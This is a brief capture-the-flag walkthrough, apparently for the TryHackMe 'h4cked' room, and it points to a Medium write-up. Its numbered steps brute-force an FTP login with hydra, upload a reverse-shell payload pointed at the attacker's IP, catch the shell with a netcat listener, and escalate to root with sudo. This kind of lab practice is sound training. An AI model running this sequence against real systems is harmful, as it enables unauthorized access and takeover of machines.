Rootkit - a type of backdoor


Hack your way back into the machine
------------------------------------
*https://overide.medium.com/h4cked-tryhackme-writeup-3f00703df636 for more info
*Look at what the hacker did on the .pcapng file to find what to do here
1. Open terminal
2. Download list of commonly used passwords
3. hydra -l jenny -P <password list> <ip address of target> ftp
4. ftp <ip address of machine>
5. Enter 'jenny' as username and enter password found
6. Copy the text of the payload in the .pcapng file in to a file, modify the ip variable to your attacking machine's ip address
7. Upload the payload to the ftp server using "put <filename>" and change the permissions to allow it to run with "chmod +x <filename>"
8. Listen to the port that we set on the payload (default was 1234) with netcat "nc -nvlp 1234"
9. Go to a web browser and run the script with "<target ip address>/<script name>"
10. Netcat should have shell now, use "python3 -c ‘import pty;pty.spawn(“/bin/bash”)" like the attacker did
11. Use "sudo su" to get root perms and find the flag
